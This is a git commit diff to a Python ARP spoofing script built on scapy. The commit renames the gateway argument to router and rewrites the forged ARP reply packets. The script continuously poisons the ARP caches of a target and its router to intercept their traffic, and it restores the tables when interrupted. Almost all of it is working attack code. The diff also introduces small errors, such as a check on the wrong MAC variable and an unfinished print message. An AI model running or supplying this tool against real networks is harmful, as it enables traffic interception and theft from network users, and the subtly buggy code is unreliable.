680a9aa89a845e0c2f9bc251b6993ff46b93595f
whitecar1 <vitalik.markovskiy.06@mail.ru>
2024-09-03 14:31:55 +0300

    Change gateway on router

--- ArpSpoofing/arpspoofer.py
+++ ArpSpoofing/arpspoofer.py
@@ -1,6 +1,6 @@
-﻿#!/bin/python3
+#!/bin/python3
 
-from scapy.all import ARP, Ether, send, getmacbyip, get_if_hwaddr
+from scapy.all import ARP, Ether, send, getmacbyip
 import argparse
 import time
 import sys
@@ -10,7 +10,7 @@ def parse_arguments():
     parser = argparse.ArgumentParser(description="This is my ArpSpoofer")
     parser.add_argument("-i", "--interface", dest="interface", required=True, help="Set the interface")
     parser.add_argument("-t", "--target", dest="target", required=True, help="Set a target IP address")
-    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="Set a gateway IP address")
+    parser.add_argument("-r", "--router", dest="router", required=True, help="Set a router IP address")
     parser.add_argument("-s", "--sleep", dest="sleep", type=int, default=2, help="Set sleep time in seconds")
     parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output")
     return parser.parse_args()
@@ -22,11 +22,11 @@ def spoofing(target_ip: str, spoof_ip: str, verb=False):
         return
 
     spoof_mac = getmacbyip(spoof_ip)
-    if spoof_mac is None:
+    if target_mac is None:
         print(f"[-] Could not find mac address to IP address: {spoof_ip}")
-        return  
-
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        return
+    
+    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip, hwsrc=spoof_mac)
     send(packet, verbose=False)
     if verb:
         print(f"[+] Send ARP response: {spoof_ip} is-at {target_mac} to {target_ip}")
@@ -34,15 +34,15 @@ def spoofing(target_ip: str, spoof_ip: str, verb=False):
 def restore(destination_ip, source_ip, verb=False):
     destination_mac = getmacbyip(destination_ip)
     if destination_mac is None:
-        print(f"Could not find mac address to destination/source IP address")
+        print(f"[-] Could not find mac address to IP address: {destination_ip}")
         return
 
     source_mac = getmacbyip(source_ip)
     if source_mac is None:
-        print(f"Could not find mac address to destination/source IP address")
+        print(f"[-] Could not find mac address to IP address: {source_ip}")
         return
 
-    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip)
+    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, verbose=False)
     if verb:
         print(f"[+] Restored ARP entry for {destination_ip} to {source_ip}")
@@ -52,23 +52,24 @@ def main():
 
     interface = args.interface
     target_ip = args.target
-    gateway_ip = args.gateway
+    router_ip = args.router
     pause = args.sleep
     verb = args.verbose
-    
+
     try:
         print(f"[+] Start of ArpSpoofing on interface {interface}")
+        print("[+] Set a flag to ")
         while True:
-            spoofing(target_ip, gateway_ip, verb)
-            spoofing(gateway_ip, target_ip, verb)
+            spoofing(target_ip, router_ip, verb)
+            spoofing(router_ip, target_ip, verb)
             time.sleep(pause)
     except KeyboardInterrupt:
-        print("\n[+] Interruped by user")
+        print("[] Interruped by user")
         time.sleep(2)
-        print("[+] Recovering ARP tables ...")
-        restore(target_ip, gateway_ip, verb)
-        restore(gateway_ip, target_ip, verb)
-        print("[+] ARP tables recovered.Exit...")
+        print("[] Recovering ARP tables ...")
+        restore(target_ip, router_ip, verb)
+        restore(router_ip, target_ip, verb)
+        print("ARP tables recovered.Exit...")
 
 if __name__ == "__main__":
     main()
